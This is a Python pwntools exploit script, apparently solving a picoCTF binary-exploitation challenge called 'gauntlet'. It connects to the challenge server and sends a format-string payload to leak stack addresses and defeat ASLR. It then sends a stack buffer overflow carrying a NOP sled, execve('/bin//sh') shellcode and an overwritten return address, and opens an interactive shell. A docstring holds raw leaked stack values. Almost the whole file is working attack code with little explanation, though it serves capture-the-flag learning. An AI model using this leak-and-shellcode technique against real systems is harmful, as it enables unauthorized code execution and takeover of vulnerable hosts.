import sys
from pwn import *

'''
With buff loc given:
b'0x7fffffffeb40\n'
b'602260 7ffff7dcf8d0 602435 603855 0 7fffffffec98 100000000 0 0 9 7ffff7dd5660 7fffffffebc8 f0b5ff 1 40079d 7ffff7de3b40 0 400750 4005a0 7fffffffec90 602260 400750 7ffff7a03bf7 1 7fffffffec98 100008000 400687 0 e29e5590ec798861 4005a0 7fffffffec90 0 0 1d61aaef35598861 1d61ba5095878861 7fff00000000 0 0 7ffff7de38d3 7ffff7dc9638 4f546 0 0 0 4005a0 7fffffffec90 4005ca 7fffffffec88 1c 1 7fffffffee50 0 7fffffffee98 7fffffffeea5 7fffffffeeae 7fffffffeedd 7fffffffef20 7fffffffef3b 7fffffffef5c 7fffffffef64 0 21 7ffff7ffb000 10 1f8bfbff 6 1000 11 64 3 400040 4 38 5 9 7 7ffff7dd3000 8 0 9 4005a0 b 670 c 670 d 671 e 671 17 0 19 7fffffffee39 1a 0 1f 7fffffffefb0 f 7fffffffee49 0 \n'
'''

# conn = process('./gauntlet')
# conn = remote('mercury.picoctf.net', 23373)
# print(conn.recvline())
conn = remote('mercury.picoctf.net', 48015)

# Leak ASLR address
exp = b'%llx '*100
with open('exp', 'wb') as fout:
	fout.write(exp)
conn.sendline(exp)
values = conn.recvline()
print(values)
values = values.split(b' ')
# gdb.attach(conn)

# Get correct stack address (calculated using output from Binary Gauntlet 1)
buf_loc = int(values[5], 16)-0x158
print('Bufferloc:', hex(buf_loc))

# http://shell-storm.org/shellcode/files/shellcode-905.php
# Add some NOPs, just in case
nop = b'\x90'*30
shellcode = nop + b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
shellcode = nop + shellcode
padding = b'A'*(112-len(shellcode))
ebp = b'B'*8
eip = p64(buf_loc+4)
exp = shellcode + padding + ebp + eip
print(exp)
print(len(exp))

conn.sendline(exp)
conn.interactive()
